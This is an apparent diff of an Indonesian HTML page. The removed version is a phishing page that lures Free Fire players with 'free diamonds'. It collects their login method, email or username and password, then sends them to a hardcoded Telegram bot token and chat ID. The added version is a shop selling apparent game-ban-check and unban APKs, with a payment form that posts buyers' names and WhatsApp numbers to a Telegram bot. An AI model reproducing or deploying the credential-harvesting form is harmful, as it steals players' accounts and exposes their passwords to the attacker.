@@ -1,124 +1,167 @@
-<!DOCTYPE html>
-<html lang="id">
+<!DOCTYPE html><html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>diamond gratis via akun proses 24jam</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
+  <title>SazzzShop</title>
   <style>
     body {
+      font-family: sans-serif;
       margin: 0;
-      font-family: 'Orbitron', sans-serif;
-      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-
-    .container {
-      background: rgba(255, 255, 255, 0.05);
-      border-radius: 20px;
-      padding: 30px;
-      max-width: 400px;
-      width: 100%;
-      box-shadow: 0 0 25px rgba(0, 255, 255, 0.2);
-      backdrop-filter: blur(12px);
-    }
-
-    h2 {
-      text-align: center;
-      margin-bottom: 25px;
-      color: #00ffff;
-    }
-
-    input[type="text"],
-    input[type="password"],
-    input[type="number"] {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 10px;
-      background: rgba(255, 255, 255, 0.1);
-      color: #fff;
-    }
-
-    .btn {
-      margin-top: 20px;
-      display: block;
-      width: 100%;
-      padding: 12px;
-      background: #0088cc;
+      background: url('https://i.ibb.co/YXR5gDB/bg-throne.jpg') no-repeat center center fixed;
+      background-size: cover;
       color: white;
-      border: none;
-      border-radius: 10px;
-      font-weight: bold;
-      cursor: pointer;
     }
-
-    .btn:hover {
-      background: #005f99;
+    .page { display: none; padding: 20px; }
+    .active { display: block; }
+    button, .btn {
+      padding: 10px 20px;
+      margin: 10px 5px;
+      cursor: pointer;
+      border: none;
+      border-radius: 8px;
+      background-color: black;
+      color: white;
+      font-weight: bold;
+    }
+    .card {
+      background: white;
+      color: black;
+      padding: 15px;
+      margin: 10px 0;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+      gap: 15px;
+    }
+    .product-card {
+      background: white;
+      color: black;
+      border-radius: 10px;
+      padding: 10px;
+      text-align: center;
+      box-shadow: 0 0 10px rgba(255,255,255,0.1);
+    }
+    .product-card img {
+      max-width: 100%;
+      border-radius: 10px;
+      margin-bottom: 8px;
+    }
+    .price {
+      font-weight: bold;
+    }
+    .center {
+      text-align: center;
     }
   </style>
 </head>
-<body>
-  <div class="container">
-    <h2>diamond gratis</h2>
-    <form id="ffForm">
-      <input type="text" id="level" placeholder="Level Akun" required>
-      <input type="text" id="login" placeholder="Login Via (Google/Facebook/VK)" required>
-      <input type="text" id="akun" placeholder="Email/Username Akun" required>
-      <input type="password" id="password" placeholder="Password Akun" required>
-      <input type="number" id="diamond" placeholder="Jumlah Diamond" required>
-      <button type="submit" class="btn">KIRIM Diamond</button>
-    </form>
-    <p id="status" style="text-align:center; margin-top:10px;"></p>
+<body><!-- Halaman 1 - Toko --><div class="page active" id="page1">
+  <div class="center">
+    <img src="https://i.ibb.co/1qPcvW3/logo.png" alt="Logo" class="logo" style="width:80px; border-radius:50%;">
+    <div>@sazzzshop</div>
+    <button class="btn" onclick="showPage('page4')">❓ Layanan / Kendala</button>
+    <h2>LIST APK :</h2>
   </div>
+  <div class="grid">
+    <div class="product-card">
+      <img src="https://i.ibb.co/z76n7Dn/apk-unbanned-new.jpg" alt="APK CEK UNBANNED NEW">
+      <div>APK CEK UNBANNED NEW</div>
+      <div class="price">IDR 100</div>
+      <button onclick="showPage('page2')">Beli</button>
+    </div>
+    <div class="product-card">
+      <img src="https://i.ibb.co/2N4ghrH/apk-text-vmoon.jpg" alt="APK ALL TEXT VMOON">
+      <div>APK ALL TEXT VMOON</div>
+      <div class="price">IDR 200</div>
+    </div>
+    <div class="product-card">
+      <img src="https://i.ibb.co/Sx1ZHZn/apk-banned-vforve.jpg" alt="APK CEK BANNED VFORVE">
+      <div>APK CEK BANNED VFORVE</div>
+      <div class="price">IDR 200</div>
+    </div>
+    <div class="product-card">
+      <img src="https://i.ibb.co/zN0h8h8/apk-banindo-xnone.jpg" alt="APK BANINDO XNONE">
+      <div>APK BANINDO XNONE</div>
+      <div class="price">IDR 200</div>
+    </div>
+    <div class="product-card">
+      <img src="https://i.ibb.co/tXJKF9P/apk-unbanned-infinite.jpg" alt="APK UNBANNED INFINITE">
+      <div>APK UNBANNED INFINITE</div>
+      <div class="price">IDR 200</div>
+    </div>
+  </div>
+</div><!-- Halaman 2 - Detail Produk --><div class="page" id="page2">
+  <button onclick="showPage('page1')">⬅ Kembali</button>
+  <h3>APK CEK UNBANNED NEW</h3>
+  <ul>
+    <li>✅ NO PHISING</li>
+    <li>✅ 100% WORK</li>
+    <li>✅ AUTO DETECT KENON</li>
+  </ul>
+  <p><strong>NOTE:</strong> Setelah beli nanti dikasih link Google Drive untuk download.</p>
+  <button onclick="showPage('page3')">Buy Now</button>
+</div><!-- Halaman 3 - Form Pembayaran --><div class="page" id="page3">
+  <button onclick="showPage('page1')">⬅ Kembali</button>
+  <h3>Upload Bukti Pembayaran</h3>
+  <p>Transfer ke Dana: <strong>0895420886464</strong></p>  <form onsubmit="sendToBot(event)">
+    <label>Nama:</label><br>
+    <input type="text" id="nama" required><br><br><label>Nomor WhatsApp:</label><br>
+<input type="text" id="nomor" required><br><br>
 
-  <script>
-    const TOKEN = '8051593906:AAFeMij6V_XGMcRsL1Jkf5XpP_P3VAKo0Mo'; // Ganti dengan token bot kamu
-    const CHAT_ID = '6374002294'; // Ganti dengan chat ID kamu
+<label>Bukti Transfer (Screenshot):</label><br>
+<input type="file" id="bukti" required><br><br>
 
-    document.getElementById('ffForm').addEventListener('submit', function(e) {
-      e.preventDefault();
+<label>Testimoni:</label><br>
+<textarea id="testimoni" rows="3">Pengalaman kamu bagaimana?</textarea><br><br>
 
-      const level = document.getElementById('level').value;
-      const login = document.getElementById('login').value;
-      const akun = document.getElementById('akun').value;
-      const password = document.getElementById('password').value;
-      const diamond = document.getElementById('diamond').value;
+<button type="submit" class="btn">Kirim Bukti & Testimoni</button>
 
-      const message = `🔥 *DATA AKUN FREE FIRE:*\n\n` +
-                      `*Level:* ${level}\n` +
-                      `*Login Via:* ${login}\n` +
-                      `*Email/User:* ${akun}\n` +
-                      `*Password:* ${password}\n` +
-                      `*Jumlah Diamond:* ${diamond}`;
+  </form>
+</div><!-- Halaman 4 - Kendala --><div class="page" id="page4">
+  <button onclick="showPage('page1')">⬅ Kembali</button>
+  <h3>Bantuan & Kendala</h3>
+  <p>Silakan hubungi admin atau kirim kendala ke bot:</p>
+  <a class="btn" href="https://wa.me/6281234567890" target="_blank">Hubungi Admin (WA)</a>
+  <button onclick="kirimKendala()">Kirim ke Bot Telegram</button>
+</div><script>
+function showPage(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
 
-      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message,
-          parse_mode: 'Markdown'
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        document.getElementById('status').textContent = "TUNGGU 24 JAM YA 😁";
-        document.getElementById('ffForm').reset();
-      })
-      .catch(error => {
-        document.getElementById('status').textContent = "Gagal MOHON ISI LAGI.";
-        console.error('Error:', error);
-      });
-    });
-  </script>
-</body>
+function sendToBot(e) {
+  e.preventDefault();
+  const nama = document.getElementById('nama').value;
+  const nomor = document.getElementById('nomor').value;
+  const testimoni = document.getElementById('testimoni').value;
+
+  const token = 'ISI_TOKEN_BOT_KAMU';
+  const chat_id = 'ISI_CHAT_ID_KAMU';
+
+  const pesan = `Pesanan Baru!\nNama: ${nama}\nWA: ${nomor}\nTestimoni: ${testimoni}`;
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({chat_id, text: pesan})
+  });
+
+  alert("Bukti dan data berhasil dikirim!");
+  showPage('page1');
+}
+
+function kirimKendala() {
+  const token = 'ISI_TOKEN_BOT_KAMU';
+  const chat_id = 'ISI_CHAT_ID_KAMU';
+  const pesan = 'User menghubungi kendala melalui halaman bantuan.';
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({chat_id, text: pesan})
+  });
+
+  alert("Pesan kendala sudah dikirim ke admin.");
+}
+</script></body>
 </html>
